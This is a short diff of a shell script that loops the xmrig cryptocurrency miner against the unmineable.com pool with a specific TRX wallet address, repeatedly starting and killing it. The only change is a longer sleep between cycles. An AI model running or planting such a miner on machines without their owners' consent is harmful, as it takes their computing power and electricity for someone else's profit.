@@ -5,7 +5,7 @@ while true; do
   ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.gt -p x &
 
   # Sleep for 10 seconds
-  sleep 10
+  sleep 30
 
   # Stop xmrig
   pkill xmrig
